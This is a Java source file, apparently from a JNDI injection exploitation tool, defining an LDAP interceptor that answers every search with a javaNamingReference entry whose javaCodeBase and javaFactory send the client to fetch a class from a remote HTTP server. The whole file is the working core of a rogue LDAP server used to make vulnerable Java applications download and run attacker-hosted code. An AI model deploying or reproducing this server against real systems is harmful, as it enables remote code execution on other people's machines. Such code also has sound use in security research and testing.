package server.ldap.interceptor;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.net.URL;

public class OperationInterceptor implements LDAPInterceptor {
    private URL codebase;

    public OperationInterceptor(URL codebase) {
        this.codebase = codebase;
    }

    @Override
    public void sendResult(Entry entry, InMemoryInterceptedSearchResult result) throws LDAPException {
        entry.addAttribute("javaClassName", "foo");
        String cbRaw = this.codebase.toString();
        String cn = "";
        int refIdx = cbRaw.lastIndexOf("/");
        if (refIdx > 0) {
            cn = cbRaw.substring(refIdx + 1);
            cbRaw = cbRaw.substring(0, refIdx + 1);
        }
        // javaCodeBase: http://127.0.0.1:8080/
        entry.addAttribute("javaCodeBase", cbRaw);
        entry.addAttribute("objectClass", "javaNamingReference");
        // javaFactory's name equals to CodeBase's name
        entry.addAttribute("javaFactory", cn);
        // client request: http://127.0.0.1:8080/{base_name}.class
        System.out.printf("[LDAP] send redirection to %s.class \n", this.codebase);

        result.sendSearchEntry(entry);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
